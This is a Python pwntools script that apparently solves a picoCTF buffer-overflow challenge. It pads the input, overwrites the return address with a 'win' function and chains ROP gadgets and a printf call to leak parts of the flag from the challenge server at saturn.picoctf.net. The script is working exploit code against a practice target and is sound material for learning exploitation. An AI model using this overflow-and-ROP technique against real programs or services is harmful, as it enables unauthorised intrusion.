from pwn import *

g = cyclic_gen()
# context.log_level = 'debug'
REMOTE = True
OFFSET = 14

# 0x08049e20: UnderConstruction address
# 0x08049da0: win address

payload = b'ABCDEFGHIJKLMN'

# Win function to get flag in memory
payload += pack(0x08049da0, 32, endianness='little')

# 0x08099050: add eax, 3; ret;
# SLOWLY INCREMENT EAX TO GET PARTS OF THE FLAG
# IDK HOW TO GET THE FULL FLAG IN ONE GO
payload += pack(0x08099050, 32, endianness='little')
payload += pack(0x08099050, 32, endianness='little')
payload += pack(0x08099050, 32, endianness='little')
payload += pack(0x08099050, 32, endianness='little')
payload += pack(0x08099050, 32, endianness='little')
payload += pack(0x08099050, 32, endianness='little')

# 0x08099128: mov ecx, eax; mov eax, ecx; ret;
payload += pack(0x08099128, 32, endianness='little')

# 0x0804fcd0: xor eax, eax; ret;
payload += pack(0x0804fcd0, 32, endianness='little')

# Call printf
payload += pack(0x08049ee8, 32, endianness='little')


# payload += pack(0x08049e20, 32, endianness='little')
# payload += g.get(286)
#payload += pack(0x08049da0, 32, endianness='little')

if REMOTE:
    r = remote('saturn.picoctf.net', 58032)

    r.recvline()
    
    r.sendline(payload)
    content = r.recvall()
    print(content)

else:
    f = open('payload', 'wb')
    f.write(payload)
    f.close()
